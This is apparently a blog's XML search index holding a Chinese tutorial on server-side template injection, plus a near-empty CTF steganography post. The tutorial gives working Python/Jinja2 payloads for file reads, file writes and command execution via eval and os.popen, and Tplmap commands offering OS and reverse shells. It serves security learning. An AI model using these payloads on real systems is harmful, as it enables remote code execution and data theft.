<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2021/12/13/SSTI/"/>
      <url>/2021/12/13/SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h3 id="一、什么是SSTI"><a href="#一、什么是SSTI" class="headerlink" title="一、什么是SSTI"></a>一、什么是SSTI</h3><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，也给出了一个注入的概念。</p><p>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。sql注入已经出世很多年了，对于sql注入的概念和原理很多人应该是相当清楚了，SSTI也是注入类的漏洞，其成因其实是可以类比于sql注入的。</p><p>sql注入是从用户获得一个输入，然后又后端脚本语言进行数据库查询，所以可以利用输入来拼接我们想要的sql语句，当然现在的sql注入防范做得已经很好了，然而随之而来的是更多的漏洞。</p><p>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p><p>现在网上提起的比较多的是Python的网站。</p><blockquote><h3 id="二、回到SSTI"><a href="#二、回到SSTI" class="headerlink" title="二、回到SSTI"></a>二、回到SSTI</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;])); </span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure><p>###注入n a m e = 进行绕过#####</p><h4 id="class-：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。"><a href="#class-：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。" class="headerlink" title="___ class ___：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。"></a>___ class ___：用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__</span><br><span class="line">&lt;type &#x27;str&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__</span><br><span class="line">&lt;type &#x27;tuple&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#x27;list&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;type &#x27;dict&#x27;&gt;</span><br></pre></td></tr></table></figure><p>__bases__：用来查看类的基类，也可是使用数组索引来查看特定位置的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;basestring&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__.__bases__</span><br><span class="line">(&lt;type &#x27;object&#x27;&gt;,)</span><br><span class="line">&gt;&gt; [].__class__.__bases__[0]</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure><p>获取基类还能用还有__mro__，比如：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].__<span class="title">class__</span>.__<span class="title">mro__</span></span></span><br><span class="line"><span class="class">(&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt;</span> &#123;&#125;.__class__.__mro__</span><br><span class="line">(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().__<span class="title">class__</span>.__<span class="title">mro__</span></span></span><br><span class="line"><span class="class">(&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().__<span class="title">class__</span>.__<span class="title">mro__</span>[1]            //使用索引就能获取基类了</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="五、一些常用的方法"><a href="#五、一些常用的方法" class="headerlink" title="五、一些常用的方法"></a>五、一些常用的方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//获取基本类</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">object</span></span><br><span class="line"></span><br><span class="line">//读文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">r&#x27;C:\1.php&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">//写文件</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/var/www/html/input&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"></span><br><span class="line">//执行任意命令</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="number">123456789101112131415161718</span></span><br></pre></td></tr></table></figure><p>上面漏洞复现时候的payload也是很强了，用类于编程的方式来展现，不用再一个个去查索引了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;         //poppen的参数就是要执行的命令</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"><span class="number">1234567891011</span></span><br></pre></td></tr></table></figure><p>有的时候还是需要绕过和沙箱逃逸才能实现SSTI的。</p><h3 id="六、SSTI神器–Tplmap"><a href="#六、SSTI神器–Tplmap" class="headerlink" title="六、SSTI神器–Tplmap"></a>六、SSTI神器–Tplmap</h3><p>先给出下载地址：<a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a><br>需要环境：PyYaml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install PyYaml</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h4 id="1、简单使用"><a href="#1、简单使用" class="headerlink" title="1、简单使用"></a>1、简单使用</h4><p>以上面复现的漏洞为例简单介绍一下用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/mnt/hgfs/共享文件夹/tplmap-master<span class="comment"># python tplmap.py -u &quot;http://192.168.1.10:8000/?name=Sea&quot;                             //判断是否是注入点</span></span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing <span class="keyword">if</span> GET parameter <span class="string">&#x27;name&#x27;</span> is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag <span class="string">&#x27;*&#x27;</span></span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag <span class="string">&#x27;$&#123;*&#125;&#x27;</span></span><br><span class="line">[+] Mako plugin is testing blind injection</span><br><span class="line">[+] Python plugin is testing rendering with tag <span class="string">&#x27;str(*)&#x27;</span></span><br><span class="line">[+] Python plugin is testing blind injection</span><br><span class="line">[+] Tornado plugin is testing rendering with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Tornado plugin is testing blind injection</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Jinja2 plugin has confirmed injection with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: name                //说明可以注入，同时给出了详细信息</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: posix-linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell <span class="built_in">command</span> execution: ok           //检验出这些利用方法对于目标环境是否可用</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File <span class="built_in">read</span>: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line">                                                                  //可以利用下面这些参数进行进一步的操作</span><br><span class="line">    --os-shellRun shell on the target</span><br><span class="line">    --os-cmdExecute shell commands</span><br><span class="line">    --bind-shell PORTConnect to a shell <span class="built_in">bind</span> to a target port</span><br><span class="line">    --reverse-shell HOST PORTSend a shell back to the attacker<span class="string">&#x27;s port</span></span><br><span class="line"><span class="string">    --upload LOCAL REMOTEUpload files to the server</span></span><br><span class="line"><span class="string">    --download REMOTE LOCALDownload remote files</span></span><br><span class="line"><span class="string">123456789101112131415161718192021222324252627282930313233343536373839</span></span><br></pre></td></tr></table></figure><p>拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//获取更多参数信息，要善于利用帮助信息来学习</span><br><span class="line">python tplmap.py -h</span><br><span class="line">12</span><br></pre></td></tr></table></figure><h4 id="2、Nunjucks模板引擎沙箱逃逸"><a href="#2、Nunjucks模板引擎沙箱逃逸" class="headerlink" title="2、Nunjucks模板引擎沙箱逃逸"></a>2、Nunjucks模板引擎沙箱逃逸</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python tplmap.py -u http://792.168.1.10:8000/?name=* --engine Nunjucks --os-shell</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>具体详情参考：<a href="https://www.anquanke.com/post/id/84336">https://www.anquanke.com/post/id/84336</a></p><h4 id="3、使用训练"><a href="#3、使用训练" class="headerlink" title="3、使用训练"></a>3、使用训练</h4><p>tplmap项目中附带有docker环境，可供学习和熟悉tplmap：<br><a href="https://github.com/epinna/tplmap/tree/master/docker-envs">https://github.com/epinna/tplmap/tree/master/docker-envs</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctf图片隐写技巧</title>
      <link href="/2021/08/01/ctf%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7/"/>
      <url>/2021/08/01/ctf%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/pan-zhuoyan/typora/raw/master/202112102248392.jpg" alt="然然"></p><p>这么简单还需要学吗</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
